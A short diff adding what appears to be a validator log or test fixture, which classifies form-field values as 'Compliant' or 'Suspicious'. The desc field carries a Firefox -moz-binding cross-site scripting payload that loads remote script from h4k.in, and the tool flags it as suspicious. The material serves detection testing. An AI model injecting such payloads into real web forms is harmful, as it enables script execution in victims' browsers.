@@ -1,0 +1,11 @@
+2016-06-24T08:03:28.452-06:00
+name : 62.G '2C'. 9'...'I1WE YZ.
+desc : style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+end : 19.07.2016
+budget : 9,254
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: 62.G '2C'. 9'...'I1WE YZ. is: Compliant
+The parameter: desc :  having value: style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a=" is: Suspicious
+The parameter: end :  having value: 19.07.2016 is: Compliant
+The parameter: budget :  having value: 9,254 is: Compliant
